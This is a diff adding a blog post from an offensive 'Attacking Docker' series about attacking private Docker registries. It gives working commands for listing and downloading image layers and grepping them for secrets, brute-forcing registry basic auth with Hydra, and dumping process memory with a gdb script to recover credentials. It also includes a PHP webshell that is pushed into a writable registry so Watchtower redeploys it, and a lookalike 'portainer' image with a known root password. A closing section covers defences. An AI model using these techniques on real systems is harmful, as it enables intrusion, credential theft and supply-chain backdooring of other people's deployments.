@@ -1,0 +1,151 @@
+---
+title: "Attacking Docker registries: layers, secrets, and supply chain"
+description: "How to abuse insecure and password-protected private registries, mine image layers for credentials, diff running containers, dump checkpoint memory, and backdoor images via Watchtower."
+date: 2022-02-20
+seriesSlug: "docker-offensive"
+seriesTitle: "Attacking Docker"
+seriesPart: 5
+seriesDescription: "Offensive Docker: container triage through escape paths, capabilities, registries, and runtime abuse."
+tags: ["docker", "registry", "supply-chain", "red-team", "docker-offensive"]
+---
+
+> Lab notes from authorised assessments and training environments. Do not point these techniques at systems you do not own or have written permission to test.
+
+Private registries are where developers store images that are not ready for Docker Hub. They are also where I find API keys baked into layers, weak basic auth, and auto-deploy pipelines that pull whatever I push. This post covers registry enumeration through supply-chain backdoors, continuing the [Attacking Docker](/blog/docker-pentest-playbook/) series.
+
+## Insecure registries on port 5000
+
+The [Docker Registry HTTP API V2](https://distribution.github.io/distribution/spec/api/) listens on port 5000 by default in lab setups. Without TLS or authentication, anyone who can reach the port can list repositories and download every layer.
+
+```bash
+curl http://target:5000/v2/_catalog
+curl http://target:5000/v2/myapp/tags/list
+curl http://target:5000/v2/myapp/manifests/latest
+curl http://target:5000/v2/myapp/blobs/sha256:abc123... -o layer.tar
+tar -xf layer.tar
+grep -riE 'password|api_key|secret|token|AWS_' .
+```
+
+Each layer is a tarball of filesystem changes. Developers commit `.env` files, config YAML, and private keys into images constantly because the layer history is invisible in day-to-day `docker pull` usage.
+
+## Password-protected registries
+
+When the registry returns `401 Unauthorized`, I treat it like any other HTTP basic auth service:
+
+```bash
+curl -k https://target:5000/v2/_catalog
+hydra -l admin -P wordlist.txt target -s 5000 https-get /v2/
+curl -k -u user:password https://target:5000/v2/_catalog
+```
+
+After credentials work, the same blob download workflow applies. [Hydra](https://github.com/vanhauser-thc/thc-hydra) is crude but effective against default passwords on internal registries.
+
+## Analysing image archives offline
+
+When I obtain a `docker save` tarball or registry blobs, I work offline with purpose-built tools:
+
+```bash
+docker save myimage > image.tar
+tar xf image.tar
+cat manifest.json | python3 -m json.tool
+```
+
+[container-diff](https://github.com/GoogleContainerTools/container-diff) compares images and analyses Dockerfile history:
+
+```bash
+container-diff analyze -t history challenge-image.tar
+```
+
+[docker-explorer](https://github.com/google/docker-explorer) helps navigate saved images from a forensic angle. For CTF-style challenges I walk layers bottom-up in `manifest.json`, extract the layer that introduced the flag or secret, and grep the unpacked tree.
+
+## Runtime diffs and checkpoints
+
+Live containers leak data in their writable layers:
+
+```bash
+docker diff wordpress
+```
+
+`docker diff` lists files created, modified, or deleted since the container started. Credentials written at runtime often appear here even when they were not in the original image.
+
+For checkpoint-enabled setups (experimental / lab):
+
+```bash
+docker ps -a
+docker checkpoint ls wordpress
+docker start --checkpoint checkpoint2-initial wordpress
+```
+
+To dump memory from a process visible inside the container (including checkpoint-restored processes), I use the gdb loop from [this Server Fault thread](https://serverfault.com/questions/173999/dump-a-linux-processs-memory-to-file):
+
+```bash
+#!/bin/bash
+grep rw-p /proc/$1/maps \
+| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
+| while read start stop; do
+    gdb --batch --pid $1 -ex \
+        "dump memory $1-$start-$stop.dump 0x$start 0x$stop"
+done
+```
+
+```bash
+strings *.dump | grep -iE 'password|token|key'
+```
+
+Tedious, but it has recovered API keys from authentication services in lab environments.
+
+## Supply chain: corrupting a live image (Watchtower)
+
+If the registry is writable and [Watchtower](https://github.com/containrrr/watchtower) auto-pulls tagged images, I push malware and wait for redeployment:
+
+```bash
+curl http://registry:5000/v2/_catalog
+docker pull registry:5000/wordpress
+docker exec -it <id> bash
+```
+
+Add a webshell and rebuild:
+
+```php
+<?php
+$output = shell_exec($_GET["cmd"]);
+echo "<pre>".$output."</pre>";
+?>
+```
+
+```dockerfile
+FROM registry:5000/wordpress
+COPY shell.php /app/shell.php
+RUN chmod 777 /app/shell.php
+```
+
+```bash
+docker build -t registry:5000/wordpress .
+docker push registry:5000/wordpress
+```
+
+Watchtower pulls the new digest, restarts the container, and I keep access without maintaining the original shell.
+
+## Supply chain: fake image impersonation
+
+Instead of modifying the legitimate image, I can push a **lookalike** that includes SSH and a known root password, name it after a trusted service (for example `portainer`), and wait for an operator or automation to run it:
+
+```dockerfile
+FROM registry:5000/sshd-docker-cli
+COPY sshd_config /etc/ssh/sshd_config
+RUN echo 'root:password' | chpasswd
+ENTRYPOINT ["/startup.sh"]
+```
+
+```bash
+docker build -t registry:5000/portainer .
+docker push registry:5000/portainer
+```
+
+If the victim runs `docker run -d -v /:/host registry:5000/portainer`, I SSH in or chroot the mounted host path. This pattern shows up in training labs and in the wild when registry access controls are weak.
+
+## Defensive notes
+
+Scan images with [Trivy](https://github.com/aquasecurity/trivy) or [Clair](https://github.com/quay/clair) before deploy, require TLS and auth on registries, pin digests instead of floating tags, and treat auto-update daemons like Watchtower as part of your supply-chain threat model. [Docker Content Trust](https://docs.docker.com/engine/security/trust/) helps when teams actually enable it.
+
+Next: [Portainer abuse, Shodan recon, and Lambda container pivots](/blog/docker-management-and-misc/).
